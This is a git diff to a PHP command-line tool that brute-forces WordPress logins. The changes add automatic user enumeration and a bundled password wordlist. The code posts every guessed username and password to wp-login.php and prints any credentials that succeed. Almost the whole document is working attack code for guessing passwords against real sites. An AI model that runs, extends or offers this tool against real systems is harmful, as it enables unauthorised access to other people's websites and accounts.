@@ -17,6 +17,9 @@ use GuzzleHttp\Cookie\CookieJar;
 use GuzzleHttp\Cookie\CookieJarInterface;
 use GuzzleHttp\Message\Response;
 use Aszone\WordPress\WordPress;
+use Mmoreram\Extractor\Filesystem\TemporaryDirectory;
+use Mmoreram\Extractor\Resolver\ExtensionResolver;
+use Mmoreram\Extractor\Extractor;
 
 
 class BruteForceController extends Command{
@@ -35,13 +38,15 @@ class BruteForceController extends Command{
                         'target',
                         InputArgument::REQUIRED,
                         'What target? Example: http://www.target.com, /home/foo/listOfTargets.txt'),
-                    new InputArgument(
+                    new InputOption(
                         'username',
-                        InputArgument::REQUIRED,
+                        'u',
+                        InputOption::VALUE_REQUIRED,
                         'What username?. Example: admin, or /home/foo/usernamelist.txt'),
-                    new InputArgument(
+                    new InputOption(
                         'wordlist',
-                        InputArgument::REQUIRED,
+                        'w',
+                        InputOption::VALUE_REQUIRED,
                         'List of password. Example: /home/foo/wordlist.lst'),
                     
                    	new InputOption(
@@ -94,19 +99,31 @@ class BruteForceController extends Command{
         //$wordlistClass = new Wordlist();
         //$dataBruteForceWordPress = new \StdClass;
         $target      = $input->getArgument('target');
-        $username    = $input->getArgument('username');
-        $wordlist    = $input->getArgument('wordlist');
+        $username    = $input->getOption('username');
+        $wordlist    = $input->getOption('wordlist');
+
+        if(empty($wordlist)){
+            $zip = new \ZipArchive;
+            $zip->open('resource/wordlist.zip');
+            $zip->extractTo('resource/tmp/');
+            $zip->close();
+            $wordlist    = 'resource/tmp/wordlist.txt';
+        }
+
+
         $resultFinal = array();
 
-        $targetIsUrl    = v::url()->notEmpty()->validate($target);
+        //$targetIsUrl    = v::url()->notEmpty()->validate($target);
         $targetIsList   = v::file()->notEmpty()->validate($target);
         $wordlistIsList = v::file()->notEmpty()->validate($wordlist);
 
         if($targetIsList && $wordlistIsList){
 
+
             // READ FILE LISTS OS PASSOWRDS AND HASHS
             $arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
             $arrTarget   = file($target,FILE_IGNORE_NEW_LINES);
+            unlink($wordlist);
 
             //CONFIG PROFRESSBAR
             $progress = new ProgressBar($output, count($arrWordlist)*count($arrTarget) );
@@ -117,38 +134,64 @@ class BruteForceController extends Command{
             $progress->setRedrawFrequency(50);
             $progress->start();
 
-            foreach ($arrTarget as $keyTarget => $valueTarget) { 
+            foreach ($arrTarget as $keyTarget => $valueTarget) {
+
                 $output->writeln(""); 
-                $output->writeln("<info>Alvo ".$keyTarget." - ".$valueTarget."</info>");
+                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
 
                 $wp = new WordPress();
+                $usernames= array();
+                //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
+                if(empty($username)){
+                    $output->writeln("<info>Searching for users, wait...</info>");
+                    //VERIFY IF LIST TXT OR SEARCH IN WORDPRESS SITE
+                    $usernames=$wp->getUsers($valueTarget);
+                }else{
+                    $usernames[]=$username;
+
+                }
+                $output->writeln("<info></info>");
+                $output->writeln("<info>".count($usernames)." of users...</info>");
+
 
                 $isWordPress=$wp->isWordPress($valueTarget);
                 $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl($valueTarget);
+                if($isWordPress){
+                    if(!empty($usernames)){
+                        foreach($usernames as $username){
+                            $output->writeln("<info>Search password of ".$username."</info>");
+                            foreach ($arrWordlist as $keyWordList => $valueWordList) {
 
+                                $progress->advance();
+                                $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);
 
-                foreach ($arrWordlist as $keyWordList => $valueWordList) {
-                    
-                    $progress->advance();
-                    $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);
+                                $validateLogon=$this->validateLogon($returnHtml);
 
-                    $validateLogon=$this->validateLogon($returnHtml);
+                                if($validateLogon){
 
-                    if($validateLogon and $isWordPress){
+                                    $resultFinal[$keyTarget]['target']=$valueTarget;
+                                    $resultFinal[$keyTarget]['username']=$username;
+                                    $resultFinal[$keyTarget]['Password']=$valueWordList;
 
-                        $resultFinal[$keyTarget]['target']=$valueTarget;
-                        $resultFinal[$keyTarget]['username']=$username;
-                        $resultFinal[$keyTarget]['Password']=$valueWordList;
+                                    $output->writeln("");
+                                    $output->writeln("<info>Login success</info>");
+                                    $output->writeln("<info>Target: ".$valueTarget."</info>");
+                                    $output->writeln("<info>Username: ".$username."</info>");
+                                    $output->writeln("<info>Password: ".$valueWordList."</info>");
+                                    break;
+                                }
 
-                        $output->writeln("");
-                        $output->writeln("<info>Login success</info>");
-                        $output->writeln("<info>Target: ".$valueTarget."</info>");
-                        $output->writeln("<info>Username: ".$username."</info>");
-                        $output->writeln("<info>Password: ".$valueWordList."</info>");
-                        break;
+                            }
+                        }
+                    }else{
+                        $output->writeln("<error>Users not found...</error>");
                     }
-                
-                }                
+
+                }else{
+                    $output->writeln("<error>This site is not WordPress...</error>");
+                }
+
+
             }
         }else{
             $output->writeln("<error>A SE FAZER AINDA</error>");
@@ -171,8 +214,8 @@ class BruteForceController extends Command{
 
 
 
-            $client 	= new Client(['base_url' => $target]);
-            $jar = new CookieJar();
+            /*$client 	= new Client(['base_url' => $target]);
+            //$jar = new CookieJar();
             $options = [
                 'config' => [
                     'curl' => [
@@ -200,21 +243,11 @@ class BruteForceController extends Command{
 
             ];
             $resultSend = $client->post( $target.'wp-login.php', $options);
-                /*->setPostField('log',$username )
-                ->setPostField('pwd',$password )
-                ->setPostField('wp-submit','Log In' )
-                ->setPostField('redirect_to',$target.'wp-admin/&testcookie=1' );*/
-            //$response = $resultSend->send();
-            //echo $resultSend->getBody();
-            //var_dump($resultSend->getHeaders());
-            //var_dump($resultSend->getEffectiveUrl());
 
-            //exit();
 
             return $resultSend->getBody()->getContents();
-
+        */
         //return false;
-        /*exit();
 
         $cookie="cookie.txt";
 
@@ -233,7 +266,7 @@ class BruteForceController extends Command{
         curl_close($ch);
         //var_dump($result);
         return $result;
-        */
+
     }
 
     protected function validateLogon($html){
@@ -241,9 +274,6 @@ class BruteForceController extends Command{
         //preg_match("/<strong>(.+?)<\/strong>/", $html, $resultMatches, PREG_OFFSET_CAPTURE, 3);
 
         $pos = strpos($html, "<strong>ERRO</strong>");
-        var_dump($html);
-        var_dump($pos);
-        exit();
         if($pos !== false){
            return false;
         }
